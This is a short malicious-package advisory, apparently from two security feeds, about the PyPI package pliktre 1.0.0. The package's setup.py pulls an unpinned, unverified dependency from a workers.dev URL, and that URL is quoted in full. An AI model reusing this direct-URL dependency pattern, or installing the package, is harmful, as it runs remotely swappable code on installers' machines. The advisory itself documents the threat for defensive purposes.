## Source: amazon-inspector (310f47a306a48ebe48ca4dc7c9975bb11c71c47d3df765cf71dfcf3bff1e3741)
pliktre 1.0.0's setup.py declares install_requires with a direct-URL dependency: `pool-logger-config-flag @ https://package-registry-receiver-stg.depx-research-bf0.workers.dev/pypi/pool_logger_config_flag-1.0.0.tar.gz`. On a plain `pip install pliktre`, pip resolves this dependency by downloading whatever bytes that Cloudflare workers.dev endpoint returns and installing them, running any setup.py / build-backend / lifecycle code inside that tarball on the installer's machine. The source is not the PyPI registry, is not pinned to a version range, has no hash or signature integrity check, and points at a host that is fully controlled by whoever operates the workers.dev subdomain — the tarball contents can be swapped at any time without any change to pliktre itself. The pliktre package's own shipped Python module is a stub, so the manifest URL is the entire effect of installing this package.

## Source: kam193 (ba8e4b99dfc691a475bf94699124b42e7fba3efdff668b5644e94b1d21cdab86)
The package uses fake http-downloaded dependencies to track downloads, and has no other purpose.
